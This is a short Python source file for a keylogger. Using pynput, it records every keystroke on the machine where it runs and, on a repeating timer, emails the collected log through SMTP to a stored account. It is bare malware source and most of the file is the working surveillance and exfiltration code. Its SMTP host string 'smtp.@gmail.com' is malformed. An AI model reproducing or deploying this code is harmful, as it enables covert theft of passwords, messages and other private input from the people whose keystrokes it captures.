import smtplib
import pynput.keyboard
import threading

class Keylogger:

    def __init__(self, time_inetrval, email, password):
        self.log = ''
        self.interval = time_inetrval
        self.email = email
        self.password = password

    def log_append(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except:
            if key == key.space:
                current_key = ' '
            elif key ==key.backspace:
                current_key = '<'
            else:
                current_key = ' ' + str(key) + ''
        self.log_append(current_key)

    def send_email(self, email, password, message):
        server = smtplib.SMTP('smtp.@gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
        
    def report(self):
        if self.log != '':
            self.send_email(self.email, self.password, self.log)
            self.log = ''
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press= self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()